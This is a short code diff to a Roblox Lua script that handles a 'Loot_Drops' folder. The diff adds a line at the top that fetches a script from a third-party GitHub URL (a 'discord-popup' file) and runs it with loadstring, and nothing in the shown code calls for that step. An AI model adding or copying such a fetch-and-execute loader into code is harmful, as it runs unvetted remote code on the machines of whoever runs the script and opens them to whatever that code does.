@@ -1,4 +1,6 @@
- local lootFolder = workspace:WaitForChild("Loot_Drops")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/discordpopup/main/discord-popup",true))()
+
+local lootFolder = workspace:WaitForChild("Loot_Drops")
 
 
  local function activateItem(item)
